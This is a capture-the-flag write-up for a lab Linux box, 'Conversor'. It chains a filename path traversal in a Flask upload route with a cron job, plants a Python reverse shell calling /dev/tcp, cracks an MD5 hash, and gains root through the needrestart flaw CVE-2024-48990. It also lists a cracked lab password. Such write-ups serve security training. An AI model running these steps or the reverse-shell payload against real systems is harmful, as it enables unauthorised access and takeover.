---
tags:
  - Linux
  - Easy
  - cron
  - Malicious_Modules
  - sudo
  - WebApp
  - Path_Traversal
  - File_Upload
  - needrestart
---
![banner.png](Images/banner.png)

## User

### Port Scan

As always, we first start off with an nmap scan. Looking at the results, we just have two ports open: HTTP and SSH.

```
# Nmap 7.95 scan initiated Sat Oct 25 19:55:39 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -vv -oA nmap/conversor 10.129.37.80  
Nmap scan report for 10.129.37.80  
Host is up, received reset ttl 63 (0.051s latency).  
Scanned at 2025-10-25 19:55:46 GMT for 14s  
Not shown: 998 closed tcp ports (reset)  
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=  
|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+  
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: Apache/2.4.52 (Ubuntu)  
|_http-title: Did not follow redirect to http://conversor.htb/  
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Read data files from: /usr/share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Sat Oct 25 19:56:00 2025 -- 1 IP address (1 host up) scanned in 21.25 seconds
```

### Obtaining a Login and Source Code

Upon inspecting the `nmap` results, we see that the site tries to redirect to `conversor.htb`, so we add that to our `/etc/hosts` file. When navigating to the site, we're greeted with a login page along with a "Register" button towards the bottom. We can register an account and log in.

![[login page.png]]
![[register page.png]]
![[home page.png]]

The site appears to be intended for users to upload XML / XSLT files to transform `nmap` results into something more aesthetically pleasing. With some experimentation, a user can upload said files, click "Convert", and view the transformed results under "Your Uploaded Files".

Additionally, by clicking "About" in the top right corner of the screen, we can find a link to download the source code.

![[source code page.png]]

### Getting a Shell through Unintended File Write / Cron

After downloading the source code and extracting it, we can see that the site is a Python Flask server. Looking at `app.py`, we can look at the `/convert` route which appears to be the code that executes the XML / XSLT conversion.

```
@app.route('/convert', methods=['POST'])  
def convert():                           
   if 'user_id' not in session:  
       return redirect(url_for('login'))  
   xml_file = request.files['xml_file']  
   xslt_file = request.files['xslt_file']                            
   from lxml import etree    
   xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)  
   xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)  
   xml_file.save(xml_path)  
   xslt_file.save(xslt_path)  
   try:  
       parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)  
       xml_tree = etree.parse(xml_path, parser)  
       xslt_tree = etree.parse(xslt_path)  
       transform = etree.XSLT(xslt_tree)  
       result_tree = transform(xml_tree)  
       result_html = str(result_tree)  
       file_id = str(uuid.uuid4())  
       filename = f"{file_id}.html"    
       html_path = os.path.join(UPLOAD_FOLDER, filename)  
       with open(html_path, "w") as f:  
           f.write(result_html)  
       conn = get_db()  
       conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))  
       conn.commit()  
       conn.close()  
       return redirect(url_for('index'))  
   except Exception as e:  
       return f"Error: {e}"
```

Additionally, we see this note in `install.md`:

```
...
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.  
  
"""  
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done  
"""
```

The combination of these two reveal a potential path to code execution. While the `lxml` and `etree` items with `xslt` appear to be pointing to some kind of XXE, that is actually a red herring. The parser line `parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)` is properly configured to avoid most if not all attempts to read files or execute payloads with it. However, the real trick is in the following four lines:

```
   xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)  
   xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)  
   xml_file.save(xml_path)  
   xslt_file.save(xslt_path)  
```

Because there is no sanitization on the filename, we can specify where the file saves. In this case, we can save a Python file into that `scripts` folder depicted in `install.md` by using a filename of `../scripts/shell.py` (as `UPLOAD_FOLDER` is set to the base directory plus `uploads`, so `scripts` would be one directory back). Because of the cron, it will execute around every 60 seconds or so. With this in mind, we first create a reverse shell in a malicious `shell.py` Python file:

```
import os
os.system("bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'")
```

We then submit it as part of the XSLT form (with any random xml file):

![[convert form.png]]

Then, we intercept the conversion with BurpSuite and update the filename to `../scripts/shell.py`.

![[filename path traversal.png]]

Finally, despite the error that appears in the browser, our listener eventually pops a shell when the cron executes the script.

![[catching shell.png]]

### Cracking FisMatHack's Hash

Upon obtaining a shell, we can find an sqlite3 database under `/var/www/conversor.htb/instance/users.db`. After exfilling it, we can find a hash for the user `fismathack`.

![[getting hash.png]]

The MD5 hash can be placed in a file `fismathack.hash` and cracked with the following command (where `--username` is used as I put `fismathack:<hash>` in my file):

`hashcat -a 0 -m 700 fismathack.hash ~/Documents/rockyou.txt --username`

This cracks to reveal the password `Keepmesafeandwarm`. Using it, we can `ssh` into the box as `fismathack`.

![[getting ssh shell.png]]

## Root

Now that we are logged in to the box, we can use `sudo -l` to reveal that we have `sudo` permissions over `/usr/sbin/needrestart`. In using the `--version` flag, we see that it is `needrestart 3.7`.

![sudo l.png](Images/sudo%20l.png)

A quick Google search shows that this version of `needrestart` is vulnerable to `CVE-2024-48990`. To exploit it, we can utilize [this GitHub PoC](https://github.com/ten-ops/CVE-2024-48990_needrestart). After running `make` in the cloned repo (and pressing Ctrl + C to kill the listener), it will create a directory `/tmp/attacker` on our machine along with `listener.sh` in the `src` directory. Both of these should be moved over to the victim box.

![[building exploit.png]]

We then use two `ssh` sessions for `fismathack`. On one session, we'll run `/dev/shm/listener.sh`. On the other, we'll run `sudo /usr/sbin/needrestart -r a`. This will ultimately run the malicious .so file in `/tmp/attacker` and will catch a root shell on the listener.

![popping root.png](Images/popping%20root.png)

## Credentials List

| Username   | Password          | Description   |
| ---------- | ----------------- | ------------- |
| fismathack | Keepmesafeandwarm | SSH user:pass |
